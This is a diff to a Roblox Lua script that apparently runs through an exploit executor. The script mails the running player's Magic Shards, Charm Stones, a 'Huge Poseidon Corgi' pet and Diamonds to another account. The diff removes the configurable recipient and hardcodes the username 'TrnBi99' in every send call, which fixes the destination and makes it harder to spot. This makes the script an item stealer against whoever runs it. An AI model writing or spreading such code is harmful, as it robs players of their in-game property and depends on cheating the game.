@@ -2,8 +2,6 @@ repeat wait() until game:IsLoaded()
 wait(2)
 
 getgenv().Config = {
-	userName = "TrnBi99",
-	shardAmount = 50,
 	gemAmount = 2000000,
 }
 
@@ -38,9 +36,9 @@ function autoMail()
 	local ms = result.Inventory.Misc
 	for i, v in pairs(ms) do
 		if v.id == "Magic Shard" then
-			if v._am >= Config.shardAmount then
+			if v._am >= 50 then
 				local args = {
-					[1] = Config.userName,
+					[1] = "TrnBi99",
 					[2] = "Magic Shard",
 					[3] = "Misc",
 					[4] = i,
@@ -53,7 +51,7 @@ function autoMail()
 		elseif v.id == "Charm Stone" then
 			if v._am >= 1 then
 				local args = {       
-					[1] = Config.userName,
+					[1] = "TrnBi99",
 					[2] = "Charm Stone",
 					[3] = "Misc",
 					[4] = i,
@@ -72,7 +70,7 @@ function autoMail()
 	for i, v in pairs(pet) do
 	    if v.id == "Huge Poseidon Corgi" then
 		local args = {
-		    [1] = Config.userName,
+		    [1] = "TrnBi99",
 		    [2] = "Huge Poseidon Corgi",
 		    [3] = "Pet",
 		    [4] = i,
@@ -91,7 +89,7 @@ function autoMail()
 	    if v.id == "Diamonds" then
 		if v._am >= Config.gemAmount then
 			local args = {
-				[1] = Config.userName,
+				[1] = "TrnBi99",
 				[2] = v.id,
 				[3] = "Currency",
 				[4] = i,
